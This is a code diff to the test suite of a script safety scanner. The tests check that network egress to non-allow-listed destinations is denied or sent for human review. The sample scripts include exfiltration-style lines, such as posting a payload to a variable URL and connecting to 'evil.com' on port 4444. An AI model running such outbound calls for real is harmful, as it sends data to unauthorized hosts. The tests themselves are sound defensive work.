@@ -103,11 +103,9 @@ def test_whitelisted_line_does_not_mask_other_egress() -> None:
     allow-listed host, but line 3's destination is a variable and cannot be
     verified — it must be reviewed, never silently allowed.
     """
-    script = (
-        "import requests\n"
-        'requests.get("https://api.openai.com/v1/models")\n'
-        "requests.post(exfil_url, data=payload)\n"
-    )
+    script = ("import requests\n"
+              'requests.get("https://api.openai.com/v1/models")\n'
+              "requests.post(exfil_url, data=payload)\n")
     report = _scan(script, ScriptLanguage.PYTHON)
     assert report.decision is SafetyDecision.NEEDS_HUMAN_REVIEW
 
@@ -135,6 +133,30 @@ def test_literal_whitelisted_egress_stays_allowed() -> None:
     report = _scan(script, ScriptLanguage.PYTHON)
     assert report.decision is SafetyDecision.ALLOW
     assert "AST009" not in report.rule_ids()
+
+
+def test_non_url_literal_egress_stays_denied() -> None:
+    """A non-whitelisted bare-host literal (no scheme) is denied, not reviewed.
+
+    ``requests.get("evil.com")`` and ``socket.connect(("evil.com", 4444))`` carry
+    no ``http(s)://`` URL, but the destination is a verifiable literal host. The
+    network refinement must extract it from the quoted string and keep the hit
+    high, satisfying "non-whitelisted egress is 100% detected" rather than
+    silently downgrading to review.
+    """
+    for script in (
+            'import requests\nrequests.get("evil.com")\n',
+            'import socket\nsocket.connect(("evil.com", 4444))\n',
+    ):
+        report = _scan(script, ScriptLanguage.PYTHON)
+        assert report.decision is SafetyDecision.DENY, script
+
+
+def test_non_url_whitelisted_literal_egress_allowed() -> None:
+    """A whitelisted bare-host literal (no scheme) is not blocked."""
+    script = 'import requests\nrequests.get("api.openai.com")\n'
+    report = _scan(script, ScriptLanguage.PYTHON)
+    assert report.decision is SafetyDecision.ALLOW
 
 
 def test_overlapping_regex_hit_is_deduped() -> None:
